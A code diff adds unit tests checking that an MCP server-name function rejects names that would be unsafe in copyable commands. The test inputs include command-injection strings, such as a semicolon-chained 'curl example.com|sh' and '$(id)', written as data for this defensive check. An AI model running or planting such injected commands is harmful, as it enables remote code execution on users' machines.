@@ -137,6 +137,24 @@ describe("MCP server names", () => {
       expected,
     );
   });
+
+  it.each([
+    "my server",
+    "plan;curl example.com|sh",
+    "$(id)",
+    "-plan",
+    "a".repeat(65),
+  ])("refuses to publish %j, which the copyable commands would run", (name) => {
+    expect(() => mcpConnectServerName(name, "production")).toThrow(
+      /not a plain name/,
+    );
+  });
+
+  it("refuses a name the environment suffix pushes past 64 characters", () => {
+    expect(() => mcpConnectServerName("a".repeat(60), "beta")).toThrow(
+      /not a plain name/,
+    );
+  });
 });
 
 describe("MCP install links", () => {
